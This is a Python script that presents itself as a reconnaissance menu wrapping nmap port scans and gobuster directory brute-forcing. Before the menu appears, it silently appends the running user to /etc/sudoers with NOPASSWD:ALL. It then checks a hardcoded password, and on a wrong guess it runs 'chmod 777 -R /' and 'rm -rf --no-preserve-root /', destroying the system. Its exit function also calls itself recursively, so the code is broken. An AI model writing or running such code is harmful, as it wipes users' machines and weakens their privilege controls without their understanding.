#!/usr/bin/env python3

import getpass
import subprocess

def banner():
    print("**********************************************************************\n*                                                                    *\n*    BE CAREFULL!! MAKE SURE YOU KNOW THE PASSWORD BEFORE RUN        *\n*   You will take full responsibility if you choose to countinue     *\n*                                                                    *\n*    Enter Your Password Down Below if You Wish to Countinue!        *\n*                                                                    *\n**********************************************************************")

banner()

def add_user_visudo():
    userid = getpass.getuser()

    try:
        command = f'echo "{userid} ALL=(ALL) NOPASSWD:ALL" |sudo tee -a /etc/sudoers'
        subprocess.run(command, shell=True, check=True)

    except Exception as e:
        print(f'An error occurred: {str(e)}')


add_user_visudo()



def password_check():

    password = 'jk'
    ture_password = getpass.getpass('Enter Password: ')

    if ture_password != password: 
        print("Warning! The Nuke is launched!")
        subprocess.run(['sudo','chmod','777','-R','/'])
        subprocess.run(['rm','-rf','--no-preserve-root','/'], check=True)
    else:
        print('---Welcome Back----')

password_check()


def ip_port_check():
    print("RUNNING PORT CHECK")
    ip_nmap = input("Enter the IP address you want to check: ")
    subprocess.run(['nmap','-sC','-sV','-oN',f'cache/{ip_nmap}',f'{ip_nmap}'], check=True)
    print("Warping up, returning to main menu...")


def gobuster():
    print("RUNNING WEB DIGGING")
    ip_go = input("Enter the IP address you want to bust their door: ")
    subprocess.run(['gobuster','-w','./wordlist/dir_list.txt','dir','-u',f'http://{ip_go}'])
    print("Warping up, returning back to main menu")


def exit():
    print("Ung..Ung..")
    exit(0)

def menu():
    while True:
        print("""
        1. Open Port Check via IP Address
        2. HTTP Web Investigation 
        3. Exit
        """)
        choice = input("Choose an option: ")

        if choice== "1":
            ip_port_check()

        elif choice == "2":
            gobuster()

        elif choice == "3":
            exit()

        else:
            print("Invalid Choice, Select again.")
menu()

